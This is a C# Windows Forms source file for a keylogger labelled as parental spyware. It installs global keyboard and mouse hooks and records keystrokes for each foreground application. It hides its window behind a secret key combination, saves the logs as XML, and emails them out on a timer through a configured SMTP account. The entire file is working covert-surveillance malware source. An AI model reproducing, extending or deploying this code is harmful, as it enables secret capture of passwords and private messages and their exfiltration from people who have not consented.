// --------------------------------------------------------------------------------------------------------------------
// <copyright file="frmMain.cs" company="">
//   
// </copyright>
// <summary>
//   The frm main.
// </summary>
// --------------------------------------------------------------------------------------------------------------------

namespace KeyLogger
{
    using System;
    using System.Collections;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Net.Mail;
    using System.Threading;
    using System.Windows.Forms;

    using Nonoe.ParentalSpyware.Core.Utils;

    /// <summary>
    /// The frm main.
    /// </summary>
    public partial class FrmMain : Form
    {
        #region Fields

        /// <summary>
        /// The _option.
        /// </summary>
        private readonly Frmoptions _option;

        /// <summary>
        /// The _allowto tik.
        /// </summary>
        private bool _allowtoTik;

        /// <summary>
        /// The _app names.
        /// </summary>
        private Stack _appNames;

        /// <summary>
        /// The _emailparams.
        /// </summary>
        private Params _emailparams;

        /// <summary>
        /// The _hooker.
        /// </summary>
        private UserActivityHook _hooker;

        /// <summary>
        /// The _is alt down.
        /// </summary>
        private bool _isAltDown;

        /// <summary>
        /// The _is control down.
        /// </summary>
        private bool _isControlDown;

        /// <summary>
        /// The _is emailer on.
        /// </summary>
        private bool _isEmailerOn;

        /// <summary>
        /// The _is fs down.
        /// </summary>
        private bool _isFsDown;

        /// <summary>
        /// The _is hide.
        /// </summary>
        private bool _isHide;

        /// <summary>
        /// The _is logger on.
        /// </summary>
        private bool _isLoggerOn;

        /// <summary>
        /// The _is shift down.
        /// </summary>
        private bool _isShiftDown;

        /// <summary>
        /// The _log data.
        /// </summary>
        private Hashtable _logData;

        /// <summary>
        /// The _logfilepath.
        /// </summary>
        private string _logfilepath = Application.StartupPath + @"\Acitivitylog.xml";

        /// <summary>
        /// The _tik.
        /// </summary>
        private int _tik;

        #endregion

        #region Constructors and Destructors

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmMain"/> class.
        /// </summary>
        public FrmMain()
        {
            this.InitializeComponent();
            this._option = new Frmoptions();
        }

        #endregion

        #region Public Methods and Operators

        /// <summary>
        /// The send mail.
        /// </summary>
        /// <param name="data">
        /// The data.
        /// </param>
        public static void SendMail(object data)
        {
            try
            {
                string mailaddress = ((Params)data).Mailaddress;
                string smtpHost = ((Params)data).SmtpHost;
                int smtpPort = ((Params)data).SmtpPort;
                string mailpassword = ((Params)data).Mailpassword;
                string logstr = ((Params)data).Logstr;
                bool sslstate = ((Params)data).EnableSsl;

                var fromAddress = new MailAddress(mailaddress, "CSKeylogger");
                var toAddress = new MailAddress(mailaddress, "CSKeylogger");
                const string subject = "Key logger Log file !";
                var smtp = new SmtpClient
                               {
                                   Host = smtpHost, 
                                   Port = smtpPort, 
                                   EnableSsl = sslstate, 
                                   DeliveryMethod = SmtpDeliveryMethod.Network, 
                                   UseDefaultCredentials = false, 
                                   Credentials = new NetworkCredential(fromAddress.Address, mailpassword)
                               };
                using (var message = new MailMessage(fromAddress, toAddress) { Subject = subject, Body = logstr, })
                {
                    smtp.Send(message);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        /// <summary>
        /// The hooker key down.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        public void HookerKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData.ToString() == "Return")
            {
                this.Logger("[Enter]");
            }

            if (e.KeyData.ToString() == "Escape")
            {
                this.Logger("[Escape]");
            }

            // Logger(e.KeyData + Environment.NewLine);
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    this._isAltDown = true;
                    break;
                case "RControlKey":
                case "LControlKey":
                    this._isControlDown = true;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    this._isShiftDown = true;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    this._isFsDown = true;
                    break;
            }

            if (this._isAltDown && this._isControlDown && this._isShiftDown && this._isFsDown)
            {
                if (this._isHide)
                {
                    this.Show();
                    this._isHide = false;
                }
                else
                {
                    this.Hide();
                    this._isHide = true;
                }
            }
        }

        /// <summary>
        /// The hooker key press.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        public void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            this._allowtoTik = true;
            if ((byte)e.KeyChar == 9)
            {
                this.Logger("[TAB]");
            }
            else if (char.IsLetterOrDigit(e.KeyChar) || char.IsPunctuation(e.KeyChar))
            {
                this.Logger(e.KeyChar.ToString());
            }
            else if (e.KeyChar == 32)
            {
                this.Logger(" ");
            }
            else if (e.KeyChar != 27 && e.KeyChar != 13)
            {
                // Escape
                this.Logger("[Char\\" + ((byte)e.KeyChar) + "]");
            }

            this._tik = 0;
        }

        /// <summary>
        /// The hooker key up.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        public void HookerKeyUp(object sender, KeyEventArgs e)
        {
            // Logger("KeyUP : " + e.KeyData.ToString() + Environment.NewLine);
            switch (e.KeyData.ToString())
            {
                case "RMenu":
                case "LMenu":
                    this._isAltDown = false;
                    break;
                case "RControlKey":
                case "LControlKey":
                    this._isControlDown = false;
                    break;
                case "LShiftKey":
                case "RShiftKey":
                    this._isShiftDown = false;
                    break;
                case "F10":
                case "F11":
                case "F12":
                    this._isFsDown = false;
                    break;
            }
        }

        /// <summary>
        /// The mouse moved.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        public void MouseMoved(object sender, MouseEventArgs e)
        {
            this.labelMousePosition.Text = string.Format("X:{0},Y={1},Wheel:{2}", e.X, e.Y, e.Delta);
            if (e.Clicks <= 0)
            {
                return;
            }

            this.txt_MouseLog.AppendText("MouseButton:" + e.Button);
            this.txt_MouseLog.AppendText(Environment.NewLine);
        }

        #endregion

        #region Methods

        /// <summary>
        /// The btn exit click.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void BtnExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        /// <summary>
        /// The btn hide click.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void BtnHideClick(object sender, EventArgs e)
        {
            this.Hide();
            this._hooker.Start();
            this._isHide = true;
        }

        /// <summary>
        /// The button start click.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void ButtonStartClick(object sender, EventArgs e)
        {
            if (!this._hooker.IsActive)
            {
                this._hooker.Start();
                if (this._isEmailerOn)
                {
                    this.timer_emailer.Enabled = true;
                }

                if (this._isLoggerOn)
                {
                    this.timer_logsaver.Enabled = true;
                }
            }
        }

        /// <summary>
        /// The button stop click.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void ButtonStopClick(object sender, EventArgs e)
        {
            if (this._hooker.IsActive)
            {
                this._hooker.Stop();
                this.timer_emailer.Enabled = false;
                this.timer_logsaver.Enabled = false;
            }
        }

        /// <summary>
        /// The generatelog.
        /// </summary>
        /// <returns>
        /// The <see cref="string"/>.
        /// </returns>
        private string Generatelog()
        {
            try
            {
                string Logdata = "CS Key logger Log Data" + Environment.NewLine;

                IDictionaryEnumerator element = this._logData.GetEnumerator();
                while (element.MoveNext())
                {
                    string processname =
                        element.Key.ToString()
                               .Trim()
                               .Substring(0, element.Key.ToString().Trim().LastIndexOf("######"))
                               .Trim();
                    string applname =
                        element.Key.ToString()
                               .Trim()
                               .Substring(element.Key.ToString().Trim().LastIndexOf("######") + 6)
                               .Trim();
                    string ldata = element.Value.ToString().Trim();

                    if (applname.Length < 25 && processname.Length < 25)
                    {
                        Logdata += applname.PadRight(25, '-');
                        Logdata += processname.PadLeft(25, '-');
                        Logdata += Environment.NewLine + "Log Data :" + Environment.NewLine;
                        Logdata += ldata + Environment.NewLine + Environment.NewLine;
                    }
                }

                Logdata += Environment.NewLine + Environment.NewLine + Environment.NewLine
                           + string.Format("LOG FILE, Data {0}", DateTime.Now.ToString());
                return Logdata;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }

            return null;
        }

        /// <summary>
        /// The logger.
        /// </summary>
        /// <param name="txt">
        /// The txt.
        /// </param>
        private void Logger(string txt)
        {
            this.txt_Log.AppendText(txt);
            this.txt_Log.SelectionStart = this.txt_Log.Text.Length;

            try
            {
                Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
                string _appName = p.ProcessName;
                string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", string.Empty);
                string _thisapplication = _appltitle + "######" + _appName;
                if (!this._appNames.Contains(_thisapplication))
                {
                    this._appNames.Push(_thisapplication);
                    this._logData.Add(_thisapplication, string.Empty);
                }

                IDictionaryEnumerator en = this._logData.GetEnumerator();
                while (en.MoveNext())
                {
                    if (en.Key.ToString() == _thisapplication)
                    {
                        string prlogdata = en.Value.ToString();
                        this._logData.Remove(_thisapplication);
                        this._logData.Add(_thisapplication, prlogdata + " " + txt);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message + ":" + ex.StackTrace);
                throw;
            }
        }

        /// <summary>
        /// The main form load.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void MainFormLoad(object sender, EventArgs e)
        {
            this._hooker = new UserActivityHook();
            this._hooker.OnMouseActivity += this.MouseMoved;
            this._hooker.KeyDown += this.HookerKeyDown;
            this._hooker.KeyPress += this.HookerKeyPress;
            this._hooker.KeyUp += this.HookerKeyUp;
            this._hooker.Stop();

            this._appNames = new Stack();
            this._logData = new Hashtable();
        }

        // Start Menu Events
        /// <summary>
        /// The mnu item about click.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void MnuItemAboutClick(object sender, EventArgs e)
        {
            var About = new frmAbout();
            About.TopMost = true;
            About.ShowDialog();
        }

        /// <summary>
        /// The mnu item exit click.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void MnuItemExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        /// <summary>
        /// The mnu item hide click.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void MnuItemHideClick(object sender, EventArgs e)
        {
            this.Hide();
            this._hooker.Start();
            this._isHide = true;
        }

        /// <summary>
        /// The mnu item save click.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void MnuItemSaveClick(object sender, EventArgs e)
        {
            var savef = new SaveFileDialog
                            {
                                Title = "Save ...", 
                                Filter = "CSKeylogger log files (*.xml)|*.xml", 
                                FileName = "Logfile.xml"
                            };
            if (savef.ShowDialog() == DialogResult.OK)
            {
                this.SaveLogfile(savef.FileName);
            }
        }

        // End Menu Events

        /// <summary>
        /// The save logfile.
        /// </summary>
        /// <param name="pathtosave">
        /// The pathtosave.
        /// </param>
        private void SaveLogfile(string pathtosave)
        {
            try
            {
                string xlspath = this._logfilepath.Substring(0, this._logfilepath.LastIndexOf("\\") + 1)
                                 + "ApplogXSL.xsl";
                if (!File.Exists(xlspath))
                {
                    File.Create(xlspath).Close();
                    string xslcontents =
                        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
                    var xslwriter = new StreamWriter(xlspath);
                    xslwriter.Write(xslcontents);
                    xslwriter.Flush();
                    xslwriter.Close();
                }

                var writer = new StreamWriter(pathtosave, false);
                IDictionaryEnumerator element = this._logData.GetEnumerator();
                writer.Write("<?xml version=\"1.0\"?>");
                writer.WriteLine(string.Empty);
                writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"ApplogXSL.xsl\"?>");
                writer.WriteLine(string.Empty);
                writer.Write("<ApplDetails>");

                while (element.MoveNext())
                {
                    writer.Write("<Apps_Log>");
                    writer.Write("<ProcessName>");
                    string processname = "<![CDATA["
                                         + element.Key.ToString()
                                                  .Trim()
                                                  .Substring(0, element.Key.ToString().Trim().LastIndexOf("######"))
                                                  .Trim() + "]]>";
                    processname = processname.Replace("\0", string.Empty);
                    writer.Write(processname);
                    writer.Write("</ProcessName>");

                    writer.Write("<ApplicationName>");
                    string applname = "<![CDATA["
                                      + element.Key.ToString()
                                               .Trim()
                                               .Substring(element.Key.ToString().Trim().LastIndexOf("######") + 6)
                                               .Trim() + "]]>";
                    writer.Write(applname);
                    writer.Write("</ApplicationName>");
                    writer.Write("<LogData>");
                    string ldata = ("<![CDATA[" + element.Value.ToString().Trim() + "]]>").Replace("\0", string.Empty);
                    writer.Write(ldata);

                    writer.Write("</LogData>");
                    writer.Write("</Apps_Log>");
                }

                writer.Write("</ApplDetails>");
                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        /// <summary>
        /// The timer 1 tick.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void Timer1Tick(object sender, EventArgs e)
        {
            if (this._allowtoTik)
            {
                this._tik += 1;

                if (this._tik != 20)
                {
                    return;
                }

                this.Logger(Environment.NewLine);
                this._tik = 0;
                this._allowtoTik = false;
            }

            if (this.txt_CurrentWindowstitle.Text == this.Text)
            {
                this.txt_CurrentWindowstitle.Text = "Current Window Title";
            }
        }

        /// <summary>
        /// The timer emailer tick.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void TimerEmailerTick(object sender, EventArgs e)
        {
            string logstr = this.Generatelog();
            var _params = new Params(
                logstr, 
                this._emailparams.Mailaddress, 
                this._emailparams.Mailpassword, 
                this._emailparams.SmtpHost, 
                this._emailparams.SmtpPort, 
                this._emailparams.EnableSsl);
            var mailer = new Thread(SendMail);
            mailer.Start(_params);
        }

        /// <summary>
        /// The timer logsaver tick.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void TimerLogsaverTick(object sender, EventArgs e)
        {
            this.SaveLogfile(this._logfilepath);
        }

        /// <summary>
        /// The mnu item_ settings_ click.
        /// </summary>
        /// <param name="sender">
        /// The sender.
        /// </param>
        /// <param name="e">
        /// The e.
        /// </param>
        private void mnuItem_Settings_Click(object sender, EventArgs e)
        {
            // we don't want log our email password!
            if (this._hooker.IsActive)
            {
                this._hooker.Stop();
            }

            if (this._option.ShowDialog() == DialogResult.OK)
            {
                if (this._option.chk_autoemailer.Checked)
                {
                    this._emailparams = new Params(
                        null, 
                        this._option.txt_emailAddress.Text, 
                        this._option.txt_emailpassword.Text, 
                        this._option.txt_smtpServer.Text, 
                        Convert.ToInt32(this._option.txt_smtpport.Text), 
                        this._option.chk_usessl.Checked);

                    this.timer_emailer.Interval = (int)(this._option.numeric_emailtime.Value * 60000);
                    this.timer_emailer.Enabled = true;
                    this._isEmailerOn = true;
                }
                else
                {
                    this.timer_emailer.Enabled = false;
                    this._isEmailerOn = false;
                }

                if (this._option.chk_autosaver.Checked)
                {
                    if (this._option.txt_filelocation.Text.ToLower() != "Activitylog.xml".ToLower())
                    {
                        this._logfilepath = this._option.txt_filelocation.Text;
                    }

                    this.timer_logsaver.Interval = (int)(this._option.numeric_savetimer.Value * 60000);
                    this.timer_logsaver.Enabled = true;
                    this._isLoggerOn = true;
                }
                else
                {
                    this.timer_logsaver.Enabled = false;
                    this._isLoggerOn = false;
                }
            }
        }

        #endregion

        /// <summary>
        /// The params.
        /// </summary>
        public class Params
        {
            #region Fields

            /// <summary>
            /// The enable ssl.
            /// </summary>
            public bool EnableSsl;

            /// <summary>
            /// The logstr.
            /// </summary>
            public string Logstr;

            /// <summary>
            /// The mailaddress.
            /// </summary>
            public string Mailaddress;

            /// <summary>
            /// The mailpassword.
            /// </summary>
            public string Mailpassword;

            /// <summary>
            /// The smtp host.
            /// </summary>
            public string SmtpHost;

            /// <summary>
            /// The smtp port.
            /// </summary>
            public int SmtpPort;

            #endregion

            #region Constructors and Destructors

            /// <summary>
            /// Initializes a new instance of the <see cref="Params"/> class.
            /// </summary>
            /// <param name="logstr">
            /// The logstr.
            /// </param>
            /// <param name="mailaddress">
            /// The mailaddress.
            /// </param>
            /// <param name="mailpassword">
            /// The mailpassword.
            /// </param>
            /// <param name="smtpHost">
            /// The smtp host.
            /// </param>
            /// <param name="smtpPort">
            /// The smtp port.
            /// </param>
            /// <param name="enablessl">
            /// The enablessl.
            /// </param>
            public Params(
                string logstr, string mailaddress, string mailpassword, string smtpHost, int smtpPort, bool enablessl)
            {
                this.Logstr = logstr;
                this.Mailaddress = mailaddress;
                this.Mailpassword = mailpassword;
                this.SmtpHost = smtpHost;
                this.SmtpPort = smtpPort;
                this.EnableSsl = enablessl;
            }

            #endregion
        }
    }
}